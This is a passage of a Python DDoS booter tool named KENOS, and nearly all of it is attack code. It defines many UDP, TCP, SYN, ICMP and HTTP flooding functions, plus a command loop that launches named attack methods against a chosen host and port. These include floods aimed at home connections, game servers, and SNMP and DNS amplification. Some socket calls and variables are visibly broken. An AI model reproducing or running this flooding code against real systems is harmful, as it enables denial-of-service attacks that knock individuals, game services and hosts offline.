\x1b[0;38;2;0;175;255m                	║\x1b[0m Navigation \x1b[0;38;2;0;175;255m║\x1b[0m Navigation for kenos.           \x1b[0;38;2;0;175;255m║
\x1b[0;38;2;0;165;255m                	║\x1b[0m Clear      \x1b[0;38;2;0;165;255m║\x1b[0m Clears Screen.                  \x1b[0;38;2;0;165;255m║
\x1b[0;38;2;0;155;255m                	║\x1b[0m Exit       \x1b[0;38;2;0;155;255m║\x1b[0m Exit function.                  \x1b[0;38;2;0;155;255m║
\x1b[0;38;2;0;145;255m                	╚════════════╩═════════════════════════════════╝"""

# GIF Frames


# GIF Functions


# Methods Rules
fsubs = 0
liips = 0
tattacks = 0
uaid = 0
said = 0
iaid = 0
haid = 0
tpings = 0
pscans = 0
liips = 0
running = 0
aid = 0
atks = 0
attack = True
udp = True
syn = True
icmp = True
ovh = True
nfo = True
attack = True
ldap = True
onhold = True
http = True

# Pkt Sender Functions
def udp(host, port, timer, bytes):
    global atks
    global running
    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    atks += 1
    running += 1
    while time.time() < timeout and attack:
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
    atks -= 1
    running -= 1

def udpflood(host, port, timer, bytes):
    global atks
    global running
    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 17)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    atks += 1
    running += 1
    while time.time() < timeout and attack:
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
    atks -= 1
    running -= 1

def tcp(host, port, timer, bytes):
    global atks
    global running
    timeout = time.time() + float(timer)
    atks += 1
    running += 1
    while time.time() < timeout and attack:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_TCP, 17)
            sock.sendto(bytes, (host, int(port)))
            sock.sendto(bytes, (host, int(port)))
            sock.sendto(bytes, (host, int(port)))
            sock.sendto(bytes, (host, int(port)))
            sock.sendto(bytes, (host, int(port)))
            sock.sendto(bytes, (host, int(port)))
            sock.sendto(bytes, (host, int(port)))
            sock.sendto(bytes, (host, int(port)))
            sock.close()
        except socket.error:
            pass
            
    atks -= 1
    running -= 1

def onholdsender(host, port, timer, punch):
	global uaid
	global ddosgaurd
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	
	uaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and udp and attack:
		sock.sendto(punch, (host, int(port)))
	uaid -= 1
	aid -= 1

def synsender(host, port, timer, punch):
	global said
	global syn
	global aid
	global tattacks
	timeout = time.time() + float(timer)
	sock = socket.socket (socket.AF_INET, socket.SOCK_RAW, socket.TCP_SYNCNT)

	said += 1
	tattacks += 1
	aid += 1
	while time.time() < timeout and syn and attack:
		sock.sendto(punch, (host, int(port)))
	said -= 1
	aid -= 1

def udpsender(host, port, timer, punch):
	global uaid
	global udp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	
	uaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and udp and attack:
		sock.sendto(punch, (host, int(port)))
	uaid -= 1
	aid -= 1

def mixudp(host, port, timer, bytes):
    global atks
    global running
    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    atks += 1
    running += 1
    while time.time() < timeout and attack:
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
    atks -= 1
    running -= 1

def icmpsender(host, port, timer, punch):
	global iaid
	global icmp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and icmp and attack:
		sock.sendto(punch, (host, int(port)))
	iaid -= 1
	aid -= 1


def httpsender(host, port, timer, punch):
	global haid
	global http
	global aid
	global tattacks

	timeout = time.time() + float(timer)

	haid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and icmp and attack:
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.sendto(punch, (host, int(port)))
			sock.close()
		except socket.error:
			pass

	haid -= 1
	aid -= 1

def stdsender(host, port, timer, payload):
	global atks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	
	atks += 1
	running += 1
	while time.time() < timeout and attack:
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
	atks -= 1
	running -= 1

def randsender(host, timer, port, punch):
	global iaid
	global aid
	global tattacks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	running += 1
	while time.time() < timeout and rand and attack:
		sock.sendto(punch, (host, int(port)))
	running -= 1
	iaid -= 1
	aid -= 1

def killalludp(host, port, timer, bytes):
    global atks
    global running
    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    atks += 1
    running += 1
    while time.time() < timeout and attack:
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
    atks -= 1
    running -= 1

def killallicmp(host, port, timer, bytes):
    global atks
    global running
    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    atks += 1
    running += 1
    while time.time() < timeout and attack:
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
    atks -= 1

def killallvse(host, port, timer, payload):
    global atks
    global running
    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    atks += 1
    running += 1
    while time.time() < timeout and attack:
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
    atks -= 1
    running -= 1

def icmp(host, port, timer, bytes):
    global atks
    global running
    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    atks += 1
    running += 1
    while time.time() < timeout and attack:
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
    atks -= 1
    running -= 1

def mixudp(host, port, timer, bytes):
    global atks
    global running
    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    atks += 1
    running += 1
    while time.time() < timeout and attack:
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
    atks -= 1
    running -= 1

def mixicmp(host, port, timer, bytes):
    global atks
    global running
    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    atks += 1
    running += 1
    while time.time() < timeout and attack:
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
    atks -= 1
    running -= 1

def homeudp(host, port, timer, bytes):
    global atks
    global running
    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    atks += 1
    running += 1
    while time.time() < timeout and attack:
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
    atks -= 1
    running -= 1  

def fortniteudp(host, port, timer, bytes):
    global atks
    global running
    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    atks += 1
    running += 1
    while time.time() < timeout and attack:
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
    atks -= 1
    running -= 1

def fortnitemixudp(host, port, timer, bytes):
    global atks
    global running
    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    atks += 1
    running += 1
    while time.time() < timeout and attack:
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
    atks -= 1
    running -= 1

def fortnitemixicmp(host, port, timer, bytes):
    global atks
    global running
    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    atks += 1
    running += 1
    while time.time() < timeout and attack:
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
    atks -= 1
    running -= 1

def homeicmp(host, port, timer, bytes):
    global atks
    global running
    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    atks += 1
    running += 1
    while time.time() < timeout and attack:
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
    atks -= 1

def homeudpivp6(host, port, timer, bytes):
    global atks
    global running
    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    atks += 1
    running += 1
    while time.time() < timeout and attack:
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
    atks -= 1
    running -= 1

def homeicmpivp6(host, port, timer, bytes):
    global atks
    global running
    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET6, socket.IPPROTO_IGMP)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    atks += 1
    running += 1
    while time.time() < timeout and attack:
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
    atks -= 1
    running -= 1

def hex(host, port, timer, payload):
    global atks
    global running
    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    atks += 1
    running += 1
    while time.time() < timeout and attack:
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
    atks -= 1
    running -= 1

# Rules Cmd Line
def rulesAuth():
	while True:
		sys.stdout.write("\x1b]2;BUILD : KENOS II | RULES: Waiting for response\x07")
		print (rules)
		sin = input("     \x1b[0;38;2;0;255;255mRules \x1b[0;38;2;0;255;255m:: \x1b[0m⮞⮞\x1b[0m ").lower()
		os.system("clear")
		sinput = sin.split(" ")[0]
		if sinput == "yes":
			os.system ("clear")
			print (banner)
			print ("                            You have accepted the rules! Enjoy!")
			main()
		elif sinput == "no":
			print ("Have a nice day, Im not trying to get feds at my front door.\n")
			exit()
		else:
			print ("	{} isn't a command.".format(sinput))
			rulesAuth()

# Main Cmd Line
def main():
	global tpings
	global pscans
	global tattacks
	global running
	global atk
	global ldap
	global rand
	global fsubs
	global liips
	global uaid
	global said
	global iaid
	global haid
	global aid
	global attack
	global dp
	global tcp
	global udp
	global syn
	global icmp
	global http

	while True:
		sys.stdout.write("\x1b]2;BUILD : KENOS II | STATS : [+] NPCS // [+] Players\x07")
		sin = input("     \033[1;00m╔══\033[1;00m[\033[32muser\033[37m@\033[1;36mKENOS\033[36m\033[00m]\n     ╚════\033[1;36m⮞⮞ ").lower()
		sinput = sin.split(" ")[0]
		if sinput == "yes":
			os.system ("clear")
			print (banner)
			print ("                            You have accepted the rules! Enjoy!")
			main()
		if sinput == "no":
			os.system ("clear")
			print ("Have a nice day, Im not trying to get feds at my front door.")
			exit()
		if sinput == "clear":
			os.system ("clear")
			print (banner)
			main()
		elif sinput == "cls":
			os.system ("clear")
			print (banner)
			main()
		elif sinput == "help":
			os.system ("clear")
			print (help)
			main()
		elif sinput == "huh":
			os.system ("clear")
			print (help)
			main()
		elif sinput == "?":
			os.system ("clear")
			print (help)
			main()
		elif sinput == "exit":
			print ("         \x1b[0;38;2;0;246;255m╔════════════════════════════╗\n         \x1b[0;38;2;0;246;255m║\x1b[0m  You are exiting KENOS V2  \x1b[0;38;2;0;246;255m║\n         \x1b[0;38;2;0;246;255m╚════════════════════════════╝\n")
			exit()
		elif sinput == "logout":
			print ("         \x1b[0;38;2;0;246;255m╔════════════════════════════╗\n         \x1b[0;38;2;0;246;255m║\x1b[0m  You are exiting KENOS V2  \x1b[0;38;2;0;246;255m║\n         \x1b[0;38;2;0;246;255m╚════════════════════════════╝")
			exit()
        #methods
		elif sinput == "methods":
			os.system ("clear")
			print (methods)
			main()
		elif sinput == "layer4":
			os.system ("clear")
			print (layer4)
			main()
		elif sinput == "layer4x2":
			os.system ("clear")
			print (layer4x2)
			main()
		elif sinput == "layer7":
			os.system ("clear")
			print (layer7)
			main()
		if sinput == "servers":
			os.system ("clear")
			print (servers)
			main()
		if sinput == "server":
			os.system ("clear")
			print (servers)
			main()
		elif sinput == "vip":
			os.system ("clear")
			print (vip)
			main()
		elif sinput == "all":
			os.system ("clear")
			print (all)
			main()
		elif sinput == "allx2":
			os.system ("clear")
			print (allx2)
			main()
		if sinput == "home":
			os.system ("clear")
			print (home)
			main()
		elif sinput == "tools":
			os.system ("clear")
			print (tools)
			main()
		elif sinput == "navigation":
			os.system ("clear")
			print (navigation)
			main()
		elif sinput == "navi":
			os.system ("clear")
			print (navigation)
			main()
		elif sinput == "update":
			os.system ("clear")
			os.system ("bash update.sh")
			main()
		elif sinput == "bulletinboard":
			os.system ("clear")
			os.system ("curl https://pastebin.com/raw/FFSjX8Yy")
			print("\n\n")
			main()
		elif sinput == "bulletin":
			os.system ("clear")
			os.system ("curl https://pastebin.com/raw/FFSjX8Yy")
			print("\n\n")
			main()
		elif sinput == "subnetcalc":
			try:
				nvinput, host = sin.split(" ")
				ip = socket.gethostbyname(host)
				os.system("curl https://api.hackertarget.com/subnetcalc/?q={}".format(ip))
			except ValueError:
				main()
		elif sinput == "geoiplookup":
			try:
				nvinput, host = sin.split(" ")
				ip = socket.gethostbyname(host)
				os.system("curl https://api.hackertarget.com/geoip/?q={}".format(ip))
			except ValueError:
				main()
		elif sinput == "iplookup":
			try:
				nvinput, host = sin.split(" ")
				ip = socket.gethostbyname(host)
				os.system("curl https://ipinfo.io/{}/json".format(ip))
				print("\n")
			except ValueError:
				main()
		elif sinput == "reverseiplookup":
			try:
				nvinput, host = sin.split(" ")
				ip = socket.gethostbyname(host)
				os.system("curl https://api.hackertarget.com/reverseiplookup/?q={}".format(ip))
			except ValueError:
				main()
		elif sinput == "attacks":
			print ("         \x1b[0;38;2;0;246;255m╔════════════════════════════╗\n         \x1b[0;38;2;0;241;255m║\x1b[0m  Concurrents: {}            \x1b[0;38;2;0;241;255m║\n         \x1b[0;38;2;0;236;255m╚════════════════════════════╝\n".format (aid))
			main()
		elif sinput == "resolve":
			liips += 1
			host = sin.split(" ")[1]
			host_ip = socket.gethostbyname(host)
			print ("\033[0m     Host: {} --> \033[0m[\033[32mConverted\033[0m] {}\n".format (host, host_ip))
			main()
		elif sinput == "udp":
			try:
				sinput, host, port, timer = sin.split(" ")
				socket.gethostbyname(host)
				pack = 1024
				print ("\n     \033[97mKENOS ⮞⮞ Your Attack Has Been Launched!\n".format (host))
				punch = random._urandom(int(pack))
				threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()
			except ValueError:
				print ("     {} Requires An Argument.\n".format (sinput))
				main()
			except socket.gaierror:
				print ("     Host: {} Invalid.\n".format (host))
				main()
		elif sinput == "tcp":
			try:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					pack = 4096
					punch = random._urandom(int(pack))
					threading.Thread(target=tcp, args=(host, port, timer, punch)).start()
					print("\n     \033[97mKENOS ⮞⮞ Your Attack Has Been Launched!\n")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "http-get":
			try:
				sinput, host, port, timer, pack = sin.split(" ")
				socket.gethostbyname(host)
				print ("     Attack Sent To: {}\n".format (host))
				punch = random._urandom(int(pack))
				threading.Thread(target=httpsender, args=(host, port, timer, punch)).start()
			except ValueError:
				print ("     {} Requires An Argument.\n".format (sinput))
				main()
			except socket.gaierror:
				print ("     Host: {} Invalid.\n".format (host))
				main()
		elif sinput == "std":
			try:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x73\x74\x64\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\n     \033[97mKENOS ⮞⮞ Your Attack Has Been Launched!\n")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "dns":
			try:
				sinput, host, port, timer = sin.split(" ")
				socket.gethostbyname(host)
				payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
				threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
				print("\n     \033[97mKENOS ⮞⮞ Your Attack Has Been Launched!\n")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udpflood":
			try:
				sinput, host, port, timer = sin.split(" ")
				socket.gethostbyname(host)
				bytes = random._urandom(int(size))
				threading.Thread(target=udpflood, args=(host, port, timer, bytes)).start()
				print("\n     \033[97mKENOS ⮞⮞ Your Attack Has Been Launched!\n")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "homefuck":
			try:
				sinput, host, port, timer = sin.split(" ")
				socket.gethostbyname(host)
				size = "1024"
				bytes = random._urandom(int(size))
				threading.Thread(target=homeudp, args=(host, port, timer, bytes)).start()
				threading.Thread(target=homeicmp, args=(host, port, timer, bytes)).start()
				threading.Thread(target=homeudpivp6, args=(host, port, timer, bytes)).start()
				threading.Thread(target=homeicmpivp6, args=(host, port, timer, bytes)).start()
				print("\n     \033[97mKENOS ⮞⮞ Your Attack Has Been Launched!\n")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udpmix":
			try:
				sinput, host, port, timer = sin.split(" ")
				socket.gethostbyname(host)
				payload = b"\xff\xff\xff\xff\x67\xff\xff\x00\x00\x65\x74\xff\x74\x61\x00\x00\x00\x74\x75\xff\xff\xff\x73\xff\xff\x00\x00\x00"
				threading.Thread(target=mixudp, args=(host, port, timer, payload)).start()
				threading.Thread(target=mixicmp, args=(host, port, timer, payload)).start()
				print("\n     \033[97mKENOS ⮞⮞ Your Attack Has Been Launched!\n")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "fortnite":
			try:
				sinput, host, port, timer = sin.split(" ")
				socket.gethostbyname(host)
				payload = b"\xff\x01\x00\xff\x01\xfd\x00\x12\x10\x5d\xff\x01\x00\xff\x01\xfd\x00\x12\x10\x5d\x12\x11\x00\x00\xfd\x12\x10\x5d\x12\x11\x12\xff\x01\x00\xff\x01\xfd\x00\x12\x10\x5d\x12\x11\x00\x00\xfd\x12\x10\x5d\x12\x11\x11\x00\x00\xfd\x12\x10\x5d\x12\x11"
				threading.Thread(target=fortnitemixicmp, args=(host, port, timer, payload)).start()
				threading.Thread(target=fortnitemixudp, args=(host, port, timer, payload)).start()
				threading.Thread(target=fortniteudp, args=(host, port, timer, payload)).start()
				print("\n     \033[97mKENOS ⮞⮞ Your Attack Has Been Launched!\n")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovh":
			try:
				sinput, host, port, timer = sin.split(" ")
				socket.gethostbyname(host)
				payload = b"\x00\x02\x00\x2f"
				threading.Thread(target=stdsender, args=(host,port, timer, payload)).start()
				threading.Thread(target=udpsender, args=(host,port, timer, bytes)).start()
				print("\n     \033[97mKENOS ⮞⮞ Your Attack Has Been Launched!\n")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "vse":
			try:
						sinput, host, port, timer = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\xff\xff\xff\xffTSource Engine Query\x00\xff\x4f\xff\xffTSource Engine Query\x00\xff\x2e\xff\xffTSource Engine Query\x00\xff\xd3\xe1\xffTSource Engine Query\x00"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("\n     \033[97mKENOS ⮞⮞ Your Attack Has Been Launched!\n")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "syn":
			try:
						sinput, host, port, timer = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("\n     \033[97mKENOS ⮞⮞ Your Attack Has Been Launched!\n")
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcpsyn":
			try:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1024
					punch = random._urandom(int(pack))
					threading.Thread(target=tcp, args=(host, port, timer, punch)).start()
					threading.Thread(target=synsender, args=(host, port, timer, punch)).start()
					print("\n     \033[97mKENOS ⮞⮞ Your Attack Has Been Launched!\n")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "homeslap":
			try:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					pack = 2048
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, port, timer, pack)).start()
					threading.Thread(target=synsender, args=(host, port, timer, punch)).start()
					print("\n     \033[97mKENOS ⮞⮞ Your Attack Has Been Launched!\n")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "homekill":
			try:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x0e\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\n     \033[97mKENOS ⮞⮞ Your Attack Has Been Launched!\n")
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "homenull":
			try:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x0d\x31\x32\x33\x34\x35\x36\x37\x38\x51\x39\x39\x39\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\n     \033[97mKENOS ⮞⮞ Your Attack Has Been Launched!\n")
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "udpv2":
			try:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1460
					punch = random._urandom(int(pack))
					threading.Thread(target=udp, args=(host, port, timer, payload)).start()
					print("\n     \033[97mKENOS ⮞⮞ Your Attack Has Been Launched!\n")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "cfbypass":
			try:
				nvinput, host = sin.split(" ")
				ip = socket.gethostbyname(host)
				os.system("node cfbypass.js {}".format(ip))
			except ValueError:
				main()
		elif sinput == "cfsocket":
			try:
				nvinput, host = sin.split(" ")
				ip = socket.gethostbyname(host)
				os.system("node cfsocket.js {}".format(ip))
			except ValueError:
				main()
		elif sinput == "httpcookie":
			try:
				nvinput, host = sin.split(" ")
				ip = socket.gethostbyname(host)
				os.system("node httpcookie.js {}".format(ip))
			except ValueError:
				main()
		elif sinput == "httpcookie2":
			try:
				nvinput, host = sin.split(" ")
				ip = socket.gethostbyname(host)
				os.system("node httpcookie2.js {}".format(ip))
			except ValueError:
				main()
		elif sinput == "httpeven":
			try:
				nvinput, host = sin.split(" ")
				ip = socket.gethostbyname(host)
				os.system("node httpeven.js {}".format(ip))
			except ValueError:
				main()
		elif sinput == "httpfuzz":
			try:
				nvinput, host = sin.split(" ")
				ip = socket.gethostbyname(host)
				os.system("node httpfuzz.js {}".format(ip))
			except ValueError:
				main()
		elif sinput == "citrix":
			try:
				sinput, host, port, timer = sin.split(" ")
				socket.gethostbyname(host)
				payload = b"\x2a\x00\x01\x32\x02\xfd\xa8\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
				threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
				print("\n     \033[97mKENOS ⮞⮞ Your Attack Has Been Launched!\n")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "snmp":
			try:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x30\x20\x02\x01\x01\x04\x06\x70\x75\x62\x6c\x69\x63\xa5\x13\x02\x02\x00\x01\x02\x01\x00\x02\x01\x46\x30\x07\x30\x05\x06\x01\x28\x05\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\n     \033[97mKENOS ⮞⮞ Your Attack Has Been Launched!\n")
			except ValueError:
				main()
		elif sinput == "snmpbulk":
			try:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xa5\x2a\x02\x04\x06\x29\x07\x31\x02\x01\x00\x02\x01\x0a\x30\x1c\x30\x0b\x06\x07\x2b\x06\x01\x02\x01\x01\x01\x05\x00\x30\x0d\x06\x09\x2b\x06\x01\x02\x01\x01\x09\x01\x03\x05\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\n     \033[97mKENOS ⮞⮞ Your Attack Has Been Launched!\n")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "killall":
			try:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x02\x00\x2f"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=killallicmp, args=(host, port, timer, payload)).start()
					threading.Thread(target=killallvse, args=(host, port, timer, payload)).start()
					threading.Thread(target=killalludp, args=(host, port, timer, payload)).start()
					print("\n     \033[97mKENOS ⮞⮞ Your Attack Has Been Launched!\n")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "killallv2":
			try:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1460
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, port, timer, punch)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, pack)).start()
					threading.Thread(target=mixudp, args=(host, port, timer, punch)).start()
					print("\n     \033[97mKENOS ⮞⮞ Your Attack Has Been Launched!\n")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "killallv3":
			try:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
